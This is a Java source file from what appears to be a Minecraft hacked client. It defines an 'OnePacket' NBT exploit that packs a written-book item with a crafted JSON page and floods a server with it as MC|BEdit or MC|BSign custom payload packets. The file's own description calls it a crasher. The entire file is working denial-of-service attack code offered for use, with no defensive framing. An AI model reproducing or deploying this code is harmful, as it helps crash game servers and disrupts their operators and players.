package wtf.norma.nekito.exploit.impl.nbt;

import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;
import wtf.norma.nekito.exception.ExploitException;
import wtf.norma.nekito.exploit.Exploit;
import wtf.norma.nekito.exploit.ExploitInfo;
import wtf.norma.nekito.exploit.ExploitType;
import wtf.norma.nekito.exploit.argument.Argument;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.NetHelper;
import wtf.norma.nekito.holder.ExploitHolder;

import java.util.concurrent.ThreadLocalRandom;

/**
 * auhtor: mori0 тεαм ĦǺχÒЯ source: https://www.youtube.com/watch?v=OxHEaFUbdlE
 */

@ExploitInfo(
        name = "OnePacket",
        type = ExploitType.NBT,
        description = "The most skidded crasher by fixmem and others"
)
public class OnePacketExploit extends Exploit<PacketBuffer> {

    public OnePacketExploit() {
        super(() -> {
            ItemStack itemStack = new ItemStack(Items.written_book);
            NBTTagCompound compound = new NBTTagCompound();

            NBTTagList pages = new NBTTagList();
            pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

            compound.setString("author", RandomStringUtils.randomAlphabetic(10));
            compound.setString("title", RandomStringUtils.randomAlphabetic(10));
            compound.setByte("resolved", (byte) 1);
            compound.setTag("pages", pages);

            itemStack.setTagCompound(compound);

            PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
            packetBuffer.writeItemStackToBuffer(itemStack);

            return packetBuffer;
        }, new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        ChatHelper.printMessage(String.format("Sending &8[&7Method: &d%s&7, Packets: &d%s&8]", getName(), args[0]));
        for (int i = 0; i < packets; i++) {
            NetHelper.sendPacket(new C17PacketCustomPayload(ThreadLocalRandom.current().nextBoolean() ? "MC|BEdit" : "MC|BSign", new PacketBuffer(exploitSource().get().copy())));
        }
        ChatHelper.printMessage(String.format("Sent &8[&7Method: &d%s&7, Time: &d%sms&8]", getName(), System.currentTimeMillis() - start));
    }
}
